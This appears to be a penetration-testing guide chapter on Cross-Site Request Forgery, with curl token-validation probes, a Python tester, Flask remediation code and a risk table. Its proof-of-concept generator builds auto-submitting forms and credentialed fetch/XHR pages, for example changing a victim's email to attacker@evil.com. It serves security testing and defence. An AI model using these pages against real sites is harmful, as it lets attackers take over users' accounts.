# WSTG-SESS-05: Testing for Cross Site Request Forgery (CSRF)

## Test ID
WSTG-SESS-05

## Test Name
Testing for Cross Site Request Forgery (CSRF)

## High-Level Description

Cross-Site Request Forgery (CSRF) forces authenticated users to execute unwanted actions on a web application. Attackers craft malicious requests that are automatically sent by the victim's browser with their session credentials, allowing unauthorized actions like password changes, fund transfers, or data modifications.

---

## What to Check

- [ ] CSRF token implementation
- [ ] Token validation on server
- [ ] SameSite cookie attribute
- [ ] Origin/Referer validation
- [ ] State-changing GET requests
- [ ] Token uniqueness and randomness

---

## How to Test

### Step 1: Identify State-Changing Operations

```bash
# Find endpoints that modify data
# Look for: POST, PUT, DELETE, PATCH requests
# Examples:
# - Password change
# - Email update
# - Fund transfer
# - Settings modification
# - Account deletion

# Capture requests with Burp and identify:
# 1. Endpoints that change state
# 2. Presence of CSRF tokens
# 3. Token validation behavior
```

### Step 2: Check for CSRF Tokens

```bash
#!/bin/bash
TARGET="https://target.com"

# Get authenticated page with form
page=$(curl -s -b "session=valid_session" "$TARGET/settings")

# Look for CSRF tokens
echo "$page" | grep -iE "csrf|token|_token|authenticity" | head -10

# Common token names:
# csrf_token, _csrf, csrfmiddlewaretoken, __RequestVerificationToken
# authenticity_token, _token, XSRF-TOKEN
```

### Step 3: Test Token Validation

```bash
#!/bin/bash
TARGET="https://target.com"
SESSION="valid_session_cookie"

# Test 1: Request without token
curl -s -X POST "$TARGET/api/change-password" \
    -b "session=$SESSION" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"newpass123"}'

# Test 2: Request with empty token
curl -s -X POST "$TARGET/api/change-password" \
    -b "session=$SESSION" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"newpass123","csrf_token":""}'

# Test 3: Request with invalid token
curl -s -X POST "$TARGET/api/change-password" \
    -b "session=$SESSION" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"newpass123","csrf_token":"invalid123"}'

# Test 4: Request with another user's token
curl -s -X POST "$TARGET/api/change-password" \
    -b "session=$SESSION" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"newpass123","csrf_token":"other_user_token"}'
```

### Step 4: CSRF PoC Generator

```python
#!/usr/bin/env python3

class CSRFPoCGenerator:
    def generate_form_poc(self, target_url, method, params, auto_submit=True):
        """Generate HTML form CSRF PoC"""

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form id="csrf_form" action="{target_url}" method="{method}">
"""
        for name, value in params.items():
            html += f'        <input type="hidden" name="{name}" value="{value}" />\n'

        html += """        <input type="submit" value="Submit" />
    </form>
"""
        if auto_submit:
            html += """    <script>
        document.getElementById('csrf_form').submit();
    </script>
"""
        html += """</body>
</html>"""

        return html

    def generate_img_poc(self, target_url):
        """Generate image-based CSRF PoC (for GET)"""
        return f"""<!DOCTYPE html>
<html>
<body>
    <img src="{target_url}" style="display:none" />
</body>
</html>"""

    def generate_xhr_poc(self, target_url, method, data, content_type="application/json"):
        """Generate XHR CSRF PoC"""
        return f"""<!DOCTYPE html>
<html>
<body>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("{method}", "{target_url}", true);
        xhr.setRequestHeader("Content-Type", "{content_type}");
        xhr.withCredentials = true;
        xhr.send('{data}');
    </script>
</body>
</html>"""

    def generate_fetch_poc(self, target_url, method, data):
        """Generate Fetch API CSRF PoC"""
        return f"""<!DOCTYPE html>
<html>
<body>
    <script>
        fetch("{target_url}", {{
            method: "{method}",
            credentials: "include",
            headers: {{"Content-Type": "application/json"}},
            body: JSON.stringify({data})
        }});
    </script>
</body>
</html>"""

# Usage
generator = CSRFPoCGenerator()

# Form-based PoC
form_poc = generator.generate_form_poc(
    "https://target.com/change-email",
    "POST",
    {"email": "attacker@evil.com"}
)
print(form_poc)
```

### Step 5: Comprehensive CSRF Tester

```python
#!/usr/bin/env python3
import requests
import re
from bs4 import BeautifulSoup

class CSRFTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []

    def authenticate(self, login_endpoint, credentials):
        """Authenticate and get session"""
        self.session.post(f"{self.base_url}{login_endpoint}", data=credentials)

    def test_endpoint(self, endpoint, method, data):
        """Test single endpoint for CSRF"""
        print(f"\n[*] Testing {method} {endpoint}")

        # Test 1: Without CSRF token
        print("  [1] Testing without token...")
        response = self._make_request(endpoint, method, data, include_token=False)
        if response.status_code in [200, 201, 302]:
            print("  [VULN] Request accepted without CSRF token")
            self.findings.append({
                "endpoint": endpoint,
                "issue": "No CSRF token required",
                "severity": "High"
            })

        # Test 2: With empty token
        print("  [2] Testing with empty token...")
        data_with_empty = {**data, "csrf_token": ""}
        response = self._make_request(endpoint, method, data_with_empty)
        if response.status_code in [200, 201, 302]:
            print("  [VULN] Empty CSRF token accepted")
            self.findings.append({
                "endpoint": endpoint,
                "issue": "Empty CSRF token accepted",
                "severity": "High"
            })

        # Test 3: With invalid token
        print("  [3] Testing with invalid token...")
        data_with_invalid = {**data, "csrf_token": "invalid_token_123"}
        response = self._make_request(endpoint, method, data_with_invalid)
        if response.status_code in [200, 201, 302]:
            print("  [VULN] Invalid CSRF token accepted")
            self.findings.append({
                "endpoint": endpoint,
                "issue": "Invalid CSRF token accepted",
                "severity": "High"
            })

    def _make_request(self, endpoint, method, data, include_token=True):
        """Make request with/without token"""
        url = f"{self.base_url}{endpoint}"

        if method.upper() == "POST":
            return self.session.post(url, data=data)
        elif method.upper() == "PUT":
            return self.session.put(url, json=data)
        elif method.upper() == "DELETE":
            return self.session.delete(url)

        return None

    def check_samesite_cookie(self):
        """Check SameSite cookie attribute"""
        print("\n[*] Checking SameSite cookie attribute...")

        response = self.session.get(self.base_url)

        for cookie in self.session.cookies:
            # Check raw Set-Cookie header for SameSite
            print(f"  Cookie: {cookie.name}")
            # Note: requests doesn't expose SameSite directly

    def generate_report(self):
        """Generate CSRF test report"""
        print("\n" + "="*50)
        print("CSRF TESTING REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo CSRF vulnerabilities found.")
            return

        print(f"\nVulnerabilities: {len(self.findings)}")
        for f in self.findings:
            print(f"\n  Endpoint: {f['endpoint']}")
            print(f"  Issue: {f['issue']}")
            print(f"  Severity: {f['severity']}")

# Usage
tester = CSRFTester("https://target.com")
tester.authenticate("/login", {"username": "test", "password": "test"})
tester.test_endpoint("/api/change-email", "POST", {"email": "new@email.com"})
tester.test_endpoint("/api/change-password", "POST", {"password": "newpass"})
tester.generate_report()
```

---

## Remediation Guide

### 1. Implement CSRF Tokens

```python
# Flask with Flask-WTF
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

# In template
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
```

### 2. SameSite Cookies

```python
app.config.update(
    SESSION_COOKIE_SAMESITE='Strict',
    SESSION_COOKIE_SECURE=True,
)
```

### 3. Origin Validation

```python
@app.before_request
def validate_origin():
    if request.method in ['POST', 'PUT', 'DELETE']:
        origin = request.headers.get('Origin')
        referer = request.headers.get('Referer')

        allowed_origins = ['https://example.com']

        if origin and origin not in allowed_origins:
            abort(403)
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| No CSRF protection | 8.8 | High |
| Token not validated | 8.8 | High |
| GET for state changes | 6.5 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-352** | Cross-Site Request Forgery (CSRF) |

---

## Checklist

```
[ ] State-changing operations identified
[ ] CSRF token presence checked
[ ] Token validation tested
[ ] SameSite cookies checked
[ ] GET requests for state changes identified
[ ] PoC created for vulnerabilities
[ ] Findings documented
[ ] Remediation provided
```
